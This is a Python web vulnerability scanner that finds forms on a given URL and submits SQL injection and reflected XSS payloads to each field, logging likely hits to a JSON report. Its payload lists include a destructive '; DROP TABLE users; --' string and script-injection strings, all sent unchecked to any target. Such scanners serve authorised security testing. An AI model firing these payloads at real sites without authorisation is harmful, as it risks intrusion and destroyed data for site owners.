#scanner.py

import requests
from bs4 import BeautifulSoup
import re
import json
from urllib.parse import urljoin
from datetime import datetime
from colorama import init, Fore, Style
import sys

init(autoreset=True)

sql_payloads = [
    ("' OR '1'='1", "Medium"),
    ("'; DROP TABLE users; --", "High"),
    ("' OR 1=1--", "High")
]

xss_payloads = [
    ("<script>alert(1)</script>", "High"),
    ("\"'><img src=x onerror=alert(1)>", "High"),
    ("<svg onload=alert(1)>", "Medium")
]

def get_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        forms = []
        for i, form in enumerate(soup.find_all("form"), 1):
            action = form.get("action")
            method = form.get("method", "get").upper()
            inputs = [input.get("name") for input in form.find_all("input") if input.get("name")]
            if action:
                full_action = urljoin(url, action)
                forms.append({"action": full_action, "method": method, "fields": inputs})
                print(Fore.CYAN + f"[+] Found form #{i}")
                print(f"    Action: {full_action}, Method: {method}, Fields: {inputs}")
        return forms
    except Exception as e:
        print(Fore.RED + f"[!] Failed to get forms: {e}")
        return []

def scan_sql_injection(url, forms, method="GET"):
    print(Fore.YELLOW + f"\n[+] Testing SQL Injection via {method}...")
    scanned_set = set()
    vuln_found = False

    for form in forms:
        for field in form['fields']:
            for payload, risk in sql_payloads:
                scan_key = (form['action'], method, field, payload)
                if scan_key in scanned_set:
                    continue
                scanned_set.add(scan_key)

                data = {f: payload if f == field else "test" for f in form['fields']}
                try:
                    if method == "GET":
                        r = requests.get(form['action'], params=data, timeout=5)
                    else:
                        r = requests.post(form['action'], data=data, timeout=5)
                    if any(err in r.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
                        print(Fore.RED + f"[!] Possible SQL Injection detected ({method}) with payload: {payload} [Risk: {risk}]")
                        report.append({
                            "url": form['action'],
                            "parameter": field,
                            "method": method,
                            "vulnerability": "SQL Injection",
                            "payload": payload,
                            "risk": risk
                        })
                        vuln_found = True
                except Exception:
                    continue

    if not vuln_found:
        print(Fore.GREEN + f"[✓] No SQL Injection vulnerabilities found via {method}.")

def scan_xss(url, forms, method="GET"):
    print(Fore.YELLOW + f"\n[+] Testing XSS via {method} (Reflected only)...")
    scanned_set = set()
    vuln_found = False

    for form in forms:
        for field in form['fields']:
            for payload, risk in xss_payloads:
                scan_key = (form['action'], method, field, payload)
                if scan_key in scanned_set:
                    continue
                scanned_set.add(scan_key)

                data = {f: payload if f == field else "test" for f in form['fields']}
                try:
                    if method == "GET":
                        r = requests.get(form['action'], params=data, timeout=5)
                    else:
                        r = requests.post(form['action'], data=data, timeout=5)
                    if payload in r.text:
                        print(Fore.RED + f"[!] Possible XSS detected ({method}) with payload: {payload} [Risk: {risk}]")
                        report.append({
                            "url": form['action'],
                            "parameter": field,
                            "method": method,
                            "vulnerability": "XSS (Reflected)",
                            "payload": payload,
                            "risk": risk
                        })
                        vuln_found = True
                except Exception:
                    continue

    if not vuln_found:
        print(Fore.GREEN + f"[✓] No XSS vulnerabilities found via {method}.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.RED + f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)

    target_url = sys.argv[1]
    report = []

    print(Fore.BLUE + f"[~] Searching for forms in: {target_url}")
    forms = get_forms(target_url)

    if not forms:
        print(Fore.RED + "[!] No forms found. Exiting.")
        sys.exit(1)

    scan_sql_injection(target_url, forms, method="GET")
    scan_xss(target_url, forms, method="GET")
    scan_sql_injection(target_url, forms, method="POST")
    scan_xss(target_url, forms, method="POST")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"report_{timestamp}.json"
    with open(report_file, "w") as f:
        json.dump(report, f, indent=4)

    print(Fore.CYAN + f"\n[✔] Scan completed. Report saved to {report_file}")
    
